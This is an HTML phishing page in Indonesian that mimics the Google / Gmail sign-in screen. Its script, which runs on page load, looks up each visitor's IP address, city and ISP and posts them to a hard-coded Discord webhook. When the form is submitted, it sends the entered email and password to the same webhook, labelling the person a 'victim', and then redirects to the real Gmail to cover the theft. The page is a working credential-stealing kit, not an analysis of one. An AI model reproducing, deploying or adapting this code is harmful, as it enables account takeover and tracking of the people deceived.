<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign in - Google Accounts</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', sans-serif; }
        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; width: 100%; max-width: 450px; text-align: center; }
        .logo { width: 75px; margin-bottom: 16px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        p.sub { font-size: 16px; color: #202124; margin-bottom: 30px; }
        .input-group { position: relative; margin-bottom: 20px; text-align: left; }
        .input-group input { width: 100%; padding: 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; color: #202124; background: transparent; }
        .input-group input:focus { border: 2px solid #1a73e8; padding: 15px; }
        .btn { width: 100%; padding: 12px; background: #1a73e8; color: #fff; border: none; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; margin-top: 20px; }
        .loading { display: none; margin-top: 20px; color: #1a73e8; font-size: 14px; }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" class="logo" alt="Google">
        <h1>Masuk</h1>
        <p class="sub">untuk melanjutkan ke Gmail</p>

        <form id="loginForm">
            <div class="input-group">
                <input type="email" id="email" placeholder="Email atau telepon" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Masukkan sandi Anda" required>
            </div>
            <button type="submit" class="btn" id="btnSubmit">Berikutnya</button>
        </form>
        <div class="loading" id="loading">Memverifikasi...</div>
    </div>

    <script>
        // WEBHOOK LO UDAH DIMASUKIN KE SINI
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1564879485298540565/wMKf71_gu3EgqTqVjvTfJDY_sLzfPF6bplyl4ceOFiXMuLTZykX8F05O821YPn3b4RFu";

        // FUNGSI 1: NYEDOT IP PAS LINK DIBUKA
        async function grabIP() {
            try {
                const res = await fetch("https://ipapi.co/json/");
                const data = await res.json();
                
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🔗 **TARGET BUKA LINK!**\n🌐 **IP:** \`${data.ip}\`\n📍 **Kota:** ${data.city}, ${data.region}\n📡 **ISP:** ${data.org}`
                    })
                });
            } catch (err) { console.log("Gagal IP", err); }
        }
        window.onload = grabIP; // Jalanin otomatis

        // FUNGSI 2: NYEDOT EMAIL & PASS
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            document.getElementById('btnSubmit').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🔑 **KORBAN LOGIN!**\n📧 **Email:** \`${email}\`\n🔒 **Pass:** \`${password}\``
                    })
                });
            } catch (err) { console.log("Gagal Login", err); }

            setTimeout(() => {
                window.location.href = "https://mail.google.com"; 
            }, 3000);
        });
    </script>
</body>
</html>￼Enter
